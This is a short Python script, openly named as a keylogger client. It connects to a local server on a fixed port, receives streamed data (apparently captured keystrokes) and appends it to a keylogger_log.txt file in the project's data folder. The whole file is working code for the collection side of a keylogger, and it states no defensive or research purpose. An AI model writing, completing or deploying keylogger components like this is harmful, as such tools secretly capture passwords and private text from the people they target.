import socket
import os

def start_keylogger_client():
    host = '127.0.0.1'
    port = 48225  # This should match the server port

    # Create the data directory if it doesn't exist within the project
    data_dir = os.path.join(os.path.dirname(__file__), '..', 'data')
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)
    
    log_file = os.path.join(data_dir, 'keylogger_log.txt')

    print(f"Connecting to server at {host}:{port}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        print(f"Connected to server at {host}:{port}")
        with open(log_file, 'a') as f:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print(f"Writing data to file: {data.decode()}")
                f.write(data.decode())
                f.flush()

start_keylogger_client()
